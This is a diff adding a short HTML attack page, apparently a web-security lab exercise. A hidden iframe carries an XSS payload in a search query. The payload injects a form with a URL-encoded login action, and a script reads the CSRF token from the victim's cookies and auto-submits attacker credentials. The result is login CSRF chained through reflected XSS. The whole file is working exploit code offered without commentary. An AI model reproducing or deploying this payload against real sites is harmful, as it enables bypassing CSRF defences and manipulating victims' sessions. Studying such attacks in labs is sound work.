@@ -1,0 +1,31 @@
+<html>
+<head>
+  <style>
+    iframe{
+      display:none;
+    }
+  </style>
+</head>
+<body>
+  <iframe name="hiddenFrame" src='http://permalink.co/search?csrfdefense=1&xssdefense=0&q="<form id="haxform" target="hiddenFrame" action="%6C%6F%67%69%6E%3F%63%73%72%66%64%65%66%65%6E%73%65%3D%31%26%78%73%73%64%65%66%65%6E%73%65%3D%30" method="POST">
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+    <input id="token" type="hidden" name="csrf_token"/>
+    <input type="submit" value="View my pictures"/>
+  </form>
+  <script>
+    var xmlHttp = null%0A
+    xmlHttp = new XMLHttpRequest()%0A
+    xmlHttp.open( "GET", "", false )%0A
+    xmlHttp.send( null )%0A
+    var index=document.cookie.search("csrf_token")%0A
+    document.getElementById("token").value=document.cookie.substring(index%2B11, index%2B43)%0A
+    document.getElementById("haxform").submit()
+  </script>"'></iframe>
+  <script>
+
+  </script>
+
+</body>
+
+</html>
